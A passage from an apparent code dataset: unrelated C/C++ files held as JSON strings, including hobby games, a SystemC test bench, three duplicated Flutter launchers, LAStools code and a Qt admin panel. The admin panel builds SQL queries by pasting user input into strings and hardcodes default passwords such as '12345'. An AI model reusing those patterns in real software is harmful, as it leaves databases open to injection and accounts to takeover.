_measurement[i] << \" \";\n    }\n\n    for (int i=0; i<2; i++)\n      for (int j=i; j<2; j++){\n  os << \" \" <<  information()(i,j);\n    }\n    return os.good();\n  }\n\n/**InverseSim3ProjectXYZ*/\n\n  EdgeInverseSim3ProjectXYZ::EdgeInverseSim3ProjectXYZ() :\n  BaseBinaryEdge<2, Vector2d, VertexSBAPointXYZ, VertexSim3Expmap>()\n  {\n  }\n\n  bool EdgeInverseSim3ProjectXYZ::read(std::istream& is)\n  {\n    for (int i=0; i<2; i++)\n    {\n      is >> _measurement[i];\n    }\n\n    for (int i=0; i<2; i++)\n      for (int j=i; j<2; j++) {\n  is >> information()(i,j);\n      if (i!=j)\n        information()(j,i)=information()(i,j);\n    }\n    return true;\n  }\n\n  bool EdgeInverseSim3ProjectXYZ::write(std::ostream& os) const\n  {\n    for (int i=0; i<2; i++){\n      os  << _measurement[i] << \" \";\n    }\n\n    for (int i=0; i<2; i++)\n      for (int j=i; j<2; j++){\n  os << \" \" <<  information()(i,j);\n    }\n    return os.good();\n  }\n\n\n//  void EdgeSim3ProjectXYZ::linearizeOplus()\n//  {\n//    VertexSim3Expmap * vj = static_cast<VertexSim3Expmap *>(_vertices[1]);\n//    Sim3 T = vj->estimate();\n\n//    VertexPointXYZ* vi = static_cast<VertexPointXYZ*>(_vertices[0]);\n//    Vector3d xyz = vi->estimate(",
    "#include<bits/stdc++.h>\r\n#include \"iGraphics.h\"\r\n#include <string.h>\r\n#include <stdbool.h>\r\n#include<ctype.h>\r\n#include <windows.h>\r\n#include <mmsystem.h>\r\n#pragma comment(lib, \"winmm.lib\")\r\nusing namespace std;\r\n//Home and Level 3 flags\r\nint home=1;\r\nint level1 = 0; // if it is set to one level 1 will display\r\nint level3=0;\r\nint level2=0;\r\n\r\nchar str[300], str2[300], encrypt[300]; // for storing the input\r\nchar entry[300];\r\nint len = 0;\r\nint mode = 1; // level 2 round 1 is mode 1 \r\nint levels=0 ;// all level page\r\nbool musicon=true;\r\nint flagmusic=1;\r\nint instruction =0;\r\nint flag_go=0;\r\n//Level 1 Flags\r\nint flag1=0;\r\nint flag2=0;\r\nint flag3=0;\r\nint flag4=0;\r\nint flag5=0;\r\nint flag6=0;\r\nint flag7=0;\r\nint flag8=0;\r\nint flag9=0;\r\nint a=0;\r\nint b=0;\r\nint c=0;\r\nchar iq1[20]={ \"iq\\\\1.bmp\" };\r\nchar iq2[20]={ \"iq\\\\2.bmp\" };\r\nchar iq3[20]={ \"iq\\\\3.bmp\" };\r\nchar over[20]={ \"iq\\\\5.bmp\" };\r\nchar correct[20]={ \"iq\\\\4.bmp\" };\r\nchar levelup[20]={ \"iq\\\\6.bmp\" };\r\nchar score00[20]={\"iq\\\\7.bmp\"};\r\nchar score10[20]={\"iq\\\\8.bmp\"};\r\nchar score20[20]={\"iq\\\\9.bmp\"};\r\nchar score30[20]={\"iq\\\\10.bmp\"};\r\nchar score40[20]={\"iq\\\\11.bmp\"};\r\nchar score50[20]={\"iq\\\\12.bmp\"};\r\nchar score60[20]={\"iq\\\\13.bmp\"};\r\nchar score70[20]={\"iq\\\\14.bmp\"};\r\nchar score80[20]={\"iq\\\\15.bmp\"};\r\nchar score90[20]={\"iq\\\\16.bmp\"};\r\nchar score100[20]={\"iq\\\\17.bmp\"};\r\nint level1page1=0;\r\n \r\n //Level 02 flags(shafahid)\r\n\r\nchar background[20] = \"im\\\\Background.bmp\";\r\nchar gameover[20] = \"im\\\\Game_over.bmp\";\r\nvoid game2();\r\nvoid game2mouse(int button,int state,int mx,int my);\r\nvoid round_one(); // shows the first round\r\nvoid round_one_letter(); // matches the letter with answer\r\nvoid round_one_move(int button,int state,int mx,int my); // takes input string\r\nvoid round_two();// shows the second round\r\nvoid round_two_letter(); // matches the letter with answer\r\nvoid round_two_move(int button,int state,int mx,int my);\r\nvoid round_three(); // shows the three\r\nvoid round_three_letter(); // matches the letter with answer\r\nvoid round_three_move(int button,int state,int mx,int my); // takes input string\r\nvoid wrong_answer_click_2(int button,int state,int mx,int my);\r\nvoid wrong_answer_click_3(int button,int state,int mx,int my);\r\nbool round1 = 1;// checks if it is round one\r\nbool round2 = 0;// checks if it is round two\r\nbool round3 = 0;// checks if it is round three\r\nchar point[100]; // stores score\r\nstring s1[20] = {\"\"};  //  HOT\r\nstring s2[20] = {\"\"};  // LIGHT\r\nstring s3[20] = {\"\"}; // LIFE  \r\nchar A[20] = {\"im\\\\Aa.bmp\"};\r\nchar B[20] = {\"im\\\\Bb.bmp\"};\r\nchar H[20] = {\"im\\\\Hh.bmp\"};\r\nchar O[20] = {\"im\\\\Oo.bmp\"};\r\nchar S[20] = {\"im\\\\Ss.bmp\"};\r\nchar T[20] = {\"im\\\\Tt.bmp\"};\r\nchar E[20] = {\"im\\\\Ee.bmp\"};\r\nchar R[20] = {\"im\\\\Rr.bmp\"};\r\nchar F[20] = {\"im\\\\ff.bmp\"};\r\nchar sr[20] = {\"im\\\\black.bmp\"};\r\nchar L[20] = {\"im\\\\Ll.bmp\"};\r\nchar G[20] = {\"im\\\\Gg.bmp\"};\r\nchar I[20] = {\"im\\\\Ii.bmp\"};\r\nchar Life[20] = {\"im\\\\life.bmp\"};\r\nchar hot[20] = {\"im\\\\hot.bmp\"};\r\nchar Light[20] = {\"im\\\\light.bmp\"};\r\nchar cor[20]={\"iq\\\\4.bmp\"};\r\n\r\n\r\nint score = 30;\r\nchar Alphabets[30][30] = {\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"};\r\nint r1letter1=0,r1letter2=0,r1letter3=0; // flags for each letter in round one\r\nint r1letter1_id =-1,r1letter2_id =-1,r1letter3_id =-1; // stores index for each letter in round one\r\nint r2letter1=0,r2letter2=0,r2letter3=0,r2letter4=0,r2letter5=0; // flags for each letter in round two\r\nint r2letter1_id =-1,r2letter2_id =-1,r2letter3_id =-1,r2letter4_id =-1,r2letter5_id =-1; // stores index for each letter in round two\r\nint r3letter1=0,r3letter2=0,r3letter3=0,r3letter4=0; // flags for each letter in round three\r\nint r3letter1_id =-1,r3letter2_id =-1,r3letter3_id =-1,r3letter4_id=-1; // // stores index for each letter in round three\r\nstring  ans1 = \"HOT\";\r\nstring ans2 = \"LIGHT\";\r\nstring ans3 = \"LIFE\";\r\nint get1 = 0; // flag to start round two\r\nint get2 = 0; // flag to start round three\r\nint get3 = 0; // flag to start next round\r\nint flag11=0;\r\nint flag12=0;\r\nint enter1=0;\r\nint enter2=0;\r\nint enter3=0;\r\nvoid game2_1keyboard(unsigned char key);\r\nvoid game2_2keyboard(unsigned char key);\r\nvoid game2_3keyboard(unsigned char key);\r\n\r\n\r\n\r\n// Function prototypes\r\nvoid alllevels();// alllevels\r\nvoid alllevelsmouse (int button,int state,int mx,int my);\r\n\r\n \r\nvoid game3(); // declaring for whole level 3\r\n\r\n\r\n\r\nvoid game2keyboard(unsigned char key); // controlling keyboard\r\nvoid cipher(char *text, int key); // encrpyting declaration\r\nvoid game3imouse(int button,int state,int mx,int my);// controlling mouse event for level 2\r\nvoid homepagemouse(int button,int state,int mx,int my);//controlling mouse event for homepage\r\nvoid instructionmouse(int button,int state,int mx,int my);// controlling mouse event for instruction page\r\nvoid game1();//declaring for whole game\r\nvoid game1mouse(int button,int state,int mx,int my);//controlling mouse event for level 1\r\nvoid game1keyboard(unsigned char key);\r\nvoid game3keyboard(unsigned char k",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  main.cpp -- \n\n  Original Author: Rocco Jonack, Synopsys, Inc., 1999-08-02\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n#include \"stimulus.h\"\n#include \"display.h\"\n#include \"bitwidth.h\"\n\nint sc_main (int argc , char *argv[]) {\n  sc_clock        clock;\n  sc_signal<bool> reset;\n  sc_signal_bool_vector4      stimulus_line1;\n  sc_signal_bool_vector4      stimulus_line2;\n  sc_signal_bool_vector6      stimulus_line3;\n  sc_signal_bool_vector6      stimulus_line4;\n  sc_signal_bool_vector8      stimulus_line5;\n  sc_signal_bool_vector8      stimulus_line6;\n  sc_signal<bool>             input_valid;\n  sc_signal<bool>             output_valid;\n  sc_signal_bool_vector4      result_line1;\n  sc_signal_bool_vector4      result_line2;\n  sc_signal_bool_vector6      result_line3;\n  sc_signal_bool_vector6      result_line4;\n  sc_signal_bool_vector8      result_line5;\n  sc_signal_bool_vector8      result_line6;\n\n  stimulus stimulus1(\"stimulus_block\",\n                      clock,\n\t\t      reset,\n                      stimulus_line1,\n                      stimulus_line2,\n                      stimulus_line3,\n                      stimulus_line4,\n                      stimulus_line5,\n                      stimulus_line6,\n\t\t      input_valid);\n\n  bitwidth   bitwidth1    ( \"process_body\",\n                       clock, \n\t\t       reset,\n                       stimulus_line1,\n                       stimulus_line2,\n                       stimulus_line3,\n                       stimulus_line4,\n                       stimulus_line5,\n                       stimulus_line6,\n\t\t       input_valid,\n                       result_line1, \n                       result_line2, \n                       result_line3, \n                       result_line4, \n                       result_line5, \n                       result_line6, \n\t\t       output_valid);\n\n  display  display1 ( \"display\",\n                       clock,\n\t\t       result_line1,\n\t\t       result_line2,\n\t\t       result_line3,\n\t\t       result_line4,\n\t\t       result_line5,\n\t\t       result_line6,\n\t\t       output_valid);\n\n  sc_start();\n  return 0;\n}\n\n// EOF\n",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nclass Node {\r\npublic:\r\n    string kodetiket;\r\n    int hargatiket;\r\n    Node* selanjutnya;\r\n    Node* sebelumnya;\r\n\r\n    Node(const string& nama, double hargatiket) \r\n        : kodetiket(nama), hargatiket(hargatiket), selanjutnya(nullptr), sebelumnya(nullptr) {}\r\n};\r\n\r\nclass DaftarTikettersedia {\r\nprivate:\r\n    Node* kepala;\r\n    Node* ekor;\r\n\r\npublic:\r\n    DaftarTikettersedia() : kepala(nullptr), ekor(nullptr) {}\r\n\r\n    void tambahkanTiketDiAkhir(const string& nama, double harga) {\r\n        Node* nodeBaru = new Node(nama, harga);\r\n        if (ekor == nullptr) {\r\n            kepala = ekor = nodeBaru;\r\n        } else {\r\n            ekor->selanjutnya = nodeBaru;\r\n            nodeBaru->sebelumnya = ekor;\r\n            ekor = nodeBaru;\r\n        }\r\n    }\r\n    void tambahkanTiketDiAwal(const string& nama, double harga) {\r\n        Node* nodeBaru = new Node(nama, harga);\r\n        if (kepala == nullptr) {\r\n            kepala = ekor = nodeBaru;\r\n        } else {\r\n            kepala->sebelumnya = nodeBaru;\r\n            nodeBaru->selanjutnya = kepala;\r\n            kepala = nodeBaru;\r\n        }\r\n    }\r\n\r\n    void tampilkanMaju() {\r\n        Node* sementara = kepala;\r\n        while (sementara != nullptr) {\r\n            std::cout << \"Nama Tiket: \" << sementara->kodetiket << \", Harga: \" << sementara->hargatiket << endl;\r\n            sementara = sementara->selanjutnya;\r\n        }\r\n    }\r\n    \r\n    Node* cariTiket(const string& nama) {\r\n        Node* sementara = kepala;\r\n        while (sementara != nullptr) {\r\n            if (sementara->kodetiket == nama) {\r\n                return sementara;\r\n            }\r\n            sementara = sementara->selanjutnya;\r\n        }\r\n        return nullptr;\r\n    }\r\n    void hapusTiket(const string& nama) {\r\n        Node* nodeDihapus = cariTiket(nama);\r\n        if (nodeDihapus == nullptr) {\r\n            std::cout << \"Tiket dengan Kode \" << nama << \" tidak ditemukan.\" << std::endl;\r\n            return;\r\n        }\r\n\r\n        if (nodeDihapus->sebelumnya != nullptr) {\r\n            nodeDihapus->sebelumnya->selanjutnya = nodeDihapus->selanjutnya;\r\n        } else {\r\n            kepala = nodeDihapus->selanjutnya;\r\n        }\r\n\r\n        if (nodeDihapus->selanjutnya != nullptr) {\r\n            nodeDihapus->selanjutnya->sebelumnya = nodeDihapus->sebelumnya;\r\n        } else {\r\n            ekor = nodeDihapus->sebelumnya;\r\n        }\r\n\r\n        delete nodeDihapus;\r\n        std::cout << \"Tiket dengan Kode \" << nama << \" berhasil dbeli!!!!\" << std::endl;\r\n    }\r\n\r\n    ~DaftarTikettersedia() {\r\n        Node* sementara;\r\n        while (kepala != nullptr) {\r\n            sementara = kepala;\r\n            kepala = kepala->selanjutnya;\r\n            delete sementara;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    DaftarTikettersedia toko;\r\n   \r\n    cout <<\"Buana Pluto World Tour To Jakarta!!!!!!\"<<endl;\r\n    cout <<\"=======================================\"<<endl;\r\n    toko.tambahkanTiketDiAwal(\"VIPA232\", 15000000);\r\n    toko.tambahkanTiketDiAkhir(\"VIPB332\", 13000000);\r\n    toko.tambahkanTiketDiAkhir(\"VIPC887\", 5000000);\r\n    toko.tambahkanTiketDiAkhir(\"RegularA443\", 3000000);\r\n    toko.tambahkanTiketDiAkhir(\"RegularB774\", 3000000);\r\n    toko.tambahkanTiketDiAkhir(\"RegularC554\", 3000000);\r\n    toko.tambahkanTiketDiAkhir(\"LesehanZ445\", 100000);\r\n    toko.tambahkanTiketDiAkhir(\"LesehanQ113\", 100000);\r\n    toko.tambahkanTiketDiAkhir(\"LesehanG330\", 100000);\r\n    cout << \"Daftar Tiket yang tersedia:\" <<endl;\r\n    cout <<\"=======================================\"<<endl;\r\n    toko.tampilkanMaju();  \r\n    string cariNama;\r\n    cout << \"Masukan Katagori Tiket yang ingin anda beli : \"<<endl;\r\n    \r\n    cin >> cariNama;\r\n    Node* hasil = toko.cariTiket(cariNama);\r\n    if (hasil != nullptr) {\r\n        std::cout << \"Tiket ditemukan : \" << hasil->kodetiket << \", Harga: \" << hasil->hargatiket << std::endl;\r\n    } else {\r\n        std::cout << \"Tiket dengan nama \" << cariNama << \" tidak ditemukan.\" << std::endl;\r\n    }\r\n    cout <<\"=======================================\"<<endl;\r\n    toko.hapusTiket(cariNama);\r\n    cout << \"Daftar Tiket Yang Tersisa :\" <<endl;\r\n    cout <<\"=======================================\"<<endl;\r\n    toko.tampilkanMaju();\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"Tank.h\"\n#include <Arduino.h>\n#include \"Bullet.h\"\n\nextern Adafruit_SH1106G display;\n\nTank::Tank(int player_code, int startX, int startY, const unsigned char* tankBitmap, int startDir, Keypad* tankKeypad)\n  : id(player_code), x(startX), y(startY), bitmap(tankBitmap), dir(startDir), keypad(tankKeypad) {}\n\nvoid Tank::shoot(Bullet* bullet) {\n  if(!bullet->inUse){\n    analogWrite(11, 255);\n    delay(50);\n    analogWrite(11, 0);\n    if(id==0){\n      bullet->x = x+11;\n    } else {\n      bullet->x = x-1;\n    }\n    bullet->y = y+4;\n    bullet->dir = dir;\n    bullet->inUse = true;\n  }\n}\n\nbool Tank::checkCollision(Bullet* bullet) {\n  return x <= bullet->x && x+10 >= bullet->x && y <= bullet->y+2 && y+10 >= bullet->y;\n}\n\nvoid Tank::move() {\n  keypad->getKeys();\n  for (int i = 0; i < LIST_MAX; i++) {\n    if (keypad->key[i].stateChanged) {\n      if (keypad->key[i].kstate == PRESSED || keypad->key[i].kstate == HOLD) {\n        if(id == 0) {\n          processMovement1(keypad->key[i].kchar);\n        } else {\n          processMovement2(keypad->key[i].kchar);\n        }\n      }\n    }\n  }\n}\n\nvoid Tank::draw() {\n  display.drawBitmap(x, y, bitmap, 11, 11, SH110X_WHITE);\n}\n\nvoid Tank::processMovement1(int pressedKey) {\n  switch (pressedKey) {\n    case 'W': x = min(x + 1, 118); break;\n    case 'A': y = max(0, y - 1); break;\n    case 'S': x = max(0, x - 1); break;\n    case 'D': y = min(56, y + 1); break;\n    default: break;\n  }\n}\n\nvoid Tank::processMovement2(int pressedKey) {\n   switch (pressedKey) {\n    case 'W': x = max(0, x - 1); break;\n    case 'A': y = min(52, y + 1); break;\n    case 'S': x = min(116, x + 1); break;\n    case 'D': y = max(0, y - 1); break;\n    default: break;\n  }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sigma_linguist\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutterlearn\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"administer.h\"\n#include \"ui_administer.h\"\n\n\nAdminister::Administer(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Administer)\n{\n    ui->setupUi(this);\n    im.load(\":/image/logo.jpg\");\n\n    ui->EditName->setPlaceholderText(\"\u59d3\u540d\");\n    ui->EditAccount->setPlaceholderText(\"\u5b66\u53f7/\u5de5\u53f7\");\n    ui->EditPassword->setPlaceholderText(\"\u5bc6\u7801\");\n    ui->EditClass->setPlaceholderText(\"\u5bc6\u7801\");\n\n\n    ui->find->setIcon(QIcon(\":/image/find.png\"));\n\n    //connect(ui->finishimport,&QPushButton::clicked,this,&Administer::on_finishimport_clicked);\n\n    // ui->find->setStyleSheet(\n    //     \"QPushButton {\"\n    //     \"    border-radius: 15px;\"  // \u8bbe\u7f6e\u5706\u89d2\u534a\u5f84\n    //     //\"    background-color: white;\"  // \u8bbe\u7f6e\u80cc\u666f\u989c\u8272\n    //     \"    color: white;\"  // \u8bbe\u7f6e\u6587\u5b57\u989c\u8272\n    //     \"}\"\n    //     \"QPushButton:hover {\"\n    //     \"    background-color: #bbffee;\"  // \u60ac\u505c\u65f6\u7684\u80cc\u666f\u989c\u8272\n    //     \"}\"\n    //     \"QPushButton:pressed {\"\n    //     \"    background-color: #00dddd;\"  // \u6309\u4e0b\u65f6\u7684\u80cc\u666f\u989c\u8272\n    //     \"}\"\n    //     );\n\n}\n\nAdminister::~Administer()\n{\n    delete ui;\n}\n\nvoid Administer::receivelogin(){\n    this->show();\n}\n\n\n\n\n\n\n//\u4e00\u4e2a\u6d4b\u8bd5\u51fd\u6570\nvoid Administer::paintEvent(QPaintEvent *){\n    p=new QPainter;\n    p->begin(this);\n    p->setPen(QPen(Qt::black,3,Qt::SolidLine));//\u8bbe\u7f6e\u753b\u7b14\u5f62\u5f0f\n    p->setBrush(QBrush(Qt::white,Qt::SolidPattern));//\u8bbe\u7f6e\u753b\u5237\u5f62\u5f0f\n    p->drawLine(220,0,220,450);\n\n    p->end();\n}\n\n\n//\u81ea\u52a8\u5bfc\u5165\u4e00\u4e2a\u8d26\u53f7\nbool Administer::derive_data_to_sql(QSqlDatabase& db){\n    QSqlQuery query(db);\n   QString s1=\"A121\";\n\n\n   // query.exec(QString(\"insert into user(zhanghao,mima) values('%1','%2')\").arg(s1).arg(s2));\n\n    query.exec(QString(\"select* from user where zhanghao = '%1'\").arg(s1));\n    if(query.next() == false){\n        QString s1=\"A121\";\n        QString s2=\"233\";\n        QString s3=\"\u65e0\u540d\";\n        query.exec(QString(\"insert into user(zhanghao,mima,name) values('%1','%2','%3')\").arg(s1).arg(s2).arg(s3));\n        s1=\"S121\";\n        query.exec(QString(\"insert into user(zhanghao,mima,name) values('%1','%2','%3')\").arg(s1).arg(s2).arg(s3));\n        s1=\"T121\";\n        query.exec(QString(\"insert into user(zhanghao,mima,name) values('%1','%2','%3')\").arg(s1).arg(s2).arg(s3));\n        qDebug()<<\"\u63d2\u5165\u5b8c\u6210Administer\";\n        return true;\n    }\n\n    return false;\n}\n\n\n\nint Administer::getRecordCount(const QString &tableName, QSqlDatabase &db) {\n    QSqlQuery query(db);\n    QString sqlQuery = QString(\"SELECT COUNT(*) FROM %1;\").arg(tableName);\n\n    if (query.exec(sqlQuery)) {\n        if (query.next()) {\n            return query.value(0).toInt();\n        }\n        else {\n            qDebug() << \"No records found in table\" << tableName;\n            return 0; // \u8fd4\u56de\u8bb0\u5f55\u6570\u4e3a 0\n        }\n    }\n    else {\n        qDebug() << \"Query execution error:\" << query.lastError().text();\n        return -1; // \u8fd4\u56de -1 \u8868\u793a\u67e5\u8be2\u51fa\u9519\n    }\n}\n\n\n\n\nvoid Administer::on_importAccount_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(0);\n}\n\n\nvoid Administer::on_changegrade_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(1);\n}\n\n\nvoid Administer::on_manage_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(2);\n}\n\n\nvoid Administer::on_Return_clicked()\n{\n    this->hide();\n    emit showmain();\n}\n\n\n\nvoid Administer::on_resetPassword_clicked()\n{\n    QString student=ui->search2->toPlainText();\n\n    student='S'+student;\n    // \u521b\u5efaSQL\u67e5\u8be2\u5bf9\u8c61\n    QSqlQuery query(user_db);\n\n    query.exec(QString(\"update user set mima = '%1' where zhanghao = '%2'\").arg(\"12345\").arg(student));\n\n    query.finish();\n    ui->search2->clear();\n\n}\n\n\n\n//Excel\u5bfc\u5165\nvoid Administer::readAndStoreExcelData(const QString &filePath, QSqlDatabase &db) {\n#ifdef _WIN32\n    // \u6253\u5f00Excel\u5e94\u7528\u7a0b\u5e8f\n    QAxObject excel(\"Excel.Application\");\n    excel.setProperty(\"Visible\", false);\n\n    qDebug() << \"Error calling Open: \";\n\n    // \u6253\u5f00\u5de5\u4f5c\u7c3f\n    QAxObject *workbooks = excel.querySubObject(\"Workbooks\");\n    QAxObject *workbook = workbooks->querySubObject(\"Open(const QString&)\", filePath);\n\n\n\n    // \u83b7\u53d6\u5de5\u4f5c\u8868\n    QAxObject *sheets = workbook->querySubObject(\"Sheets\");\n    QAxObject *sheet = sheets->querySubObject(\"Item(int)\", 1);\n\n\n\n    // \u83b7\u53d6\u5355\u5217\u6570\u636e\u7684\u884c\u6570\n    QAxObject *usedRange = sheet->querySubObject(\"UsedRange\");\n    QAxObject *rows = usedRange->querySubObject(\"Rows\");\n    int rowCount = rows->property(\"Count\").toInt();\n    QSqlQuery query(db);\n\n    // \u8bfb\u53d6\u5355\u5217\u6570\u636e\u5e76\u5b58\u5165\u6570\u636e\u5e93\n    for (int row = 1; row <= rowCount; ++row) {\n        QString username, user_id, class_num;\n\n        QAxObject *cell1 = sheet->querySubObject(\"Cells(int,int)\", row, 1); // \u7b2c\u4e00\u5217\n        QVariant cellValue1 = cell1->dynamicCall(\"Value()\");\n        username = cellValue1.toString();\n\n        QAxObject *cell2 = sheet->querySubObject(\"Cells(int,int)\", row, 2); // \u7b2c\u4e8c\u5217\n        QVariant cellValue2 = cell2->dynamicCall(\"Value()\");\n        user_id = cellValue2.toString();\n\n        QAxObject *cell3 = sheet->querySubObject(\"Cells(int,int)\", row, 3); // \u7b2c\u4e09\u5217\n        QVariant cellValue3 = cell3->dynamicCall(\"Value()\");\n        class_num = cellValue3.toString();\n\n        QString password = \"12345\"; // \u7edf\u4e00\u8bbe\u7f6e\u5bc6\u7801\u4e3a \"12345\"\n\n        query.exec(QString(\"select* fr",
    "/*\n===============================================================================\n\n\tFILE:  lastransform.cpp\n\n\tCONTENTS:\n\n\t\tsee corresponding header file\n\n\tPROGRAMMERS:\n\n\t\tinfo@rapidlasso.de  -  https://rapidlasso.de\n\n\tCOPYRIGHT:\n\n\t\t(c) 2007-2019, rapidlasso GmbH - fast tools to catch reality\n\n\t\tThis is free software; you can redistribute and/or modify it under the\n\t\tterms of the GNU Lesser General Licence as published by the Free Software\n\t\tFoundation. See the LICENSE.txt file for more information.\n\n\t\tThis software is distributed WITHOUT ANY WARRANTY and without even the\n\t\timplied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n\n\tCHANGE HISTORY:\n\n\t\tsee corresponding header file\n\n===============================================================================\n*/\n#include \"lastransform.hpp\"\n\n#include \"lasfilter.hpp\"\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <math.h>\n\nclass LASoperationTranslateX : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"translate_x\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf \", name(), offset); };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_x(point->get_x() + offset))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationTranslateX(F64 offset) { this->offset = offset; };\nprivate:\n\tF64 offset;\n};\n\nclass LASoperationTranslateY : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"translate_y\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf \", name(), offset); };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_y(point->get_y() + offset))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationTranslateY(F64 offset) { this->offset = offset; };\nprivate:\n\tF64 offset;\n};\n\nclass LASoperationTranslateZ : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"translate_z\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf \", name(), offset); };\n\tinline U32 get_decompress_selective() const { return LASZIP_DECOMPRESS_SELECTIVE_Z; };\n\tinline void transform(LASpoint* point) {\n\t\tif (!point->set_z(point->get_z() + offset))\n\t\t{\n\t\t\toverflow++;\n\t\t}\n\t};\n\tLASoperationTranslateZ(F64 offset) { this->offset = offset; };\nprivate:\n\tF64 offset;\n};\n\nclass LASoperationTranslateXYZ : public LASoperation\n{\npublic:\n\tinline const CHAR* name() const { return \"translate_xyz\"; };\n\tinline I32 get_command(CHAR* string) const { return sprintf(string, \"-%s %lf %lf %lf \", name(), offset[0], offset[1], 